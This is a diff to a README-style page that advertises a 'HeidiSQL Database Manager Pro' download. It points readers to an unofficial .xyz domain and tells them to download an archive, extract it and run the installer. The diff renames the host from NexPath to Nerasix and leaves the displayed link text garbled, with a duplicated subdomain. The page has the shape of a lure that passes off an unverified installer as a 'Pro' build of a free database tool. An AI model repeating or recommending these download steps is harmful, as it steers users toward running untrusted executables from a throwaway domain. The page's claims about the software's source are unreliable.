@@ -13,10 +13,6 @@
 
 > Manage MySQL, MariaDB and PostgreSQL databases with a clean free GUI.
 
-## `ABOUT`
-
-HeidiSQL Database Manager Pro Complete Setup Guide — Manage MySQL, MariaDB and PostgreSQL databases with a clean free GUI.
-
 ## Download
 
 > Use the project link below for Windows.
@@ -25,6 +21,10 @@ HeidiSQL Database Manager Pro Complete Setup Guide — Manage MySQL, MariaDB and
 * **Full URL:** `https://heidisql-database-manager.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
+
+## `ABOUT`
+
+HeidiSQL Database Manager Pro Complete Setup Guide — Manage MySQL, MariaDB and PostgreSQL databases with a clean free GUI.
 
 ## `FEATURES`
 
@@ -46,12 +46,12 @@ HeidiSQL Database Manager Pro Complete Setup Guide — Manage MySQL, MariaDB and
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.heidisql-database-manager.nerasix.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the Nerasix download page, or open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.heidisql-database-manager.nerasix.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ HeidiSQL Database Manager Pro Complete Setup Guide — Manage MySQL, MariaDB and
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://heidisql-database-manager.nerasix.xyz/">heidisql-database-manager.heidisql-database-manager.nerasix.xyz</a> again and download the latest version from Nerasix.
 </details>
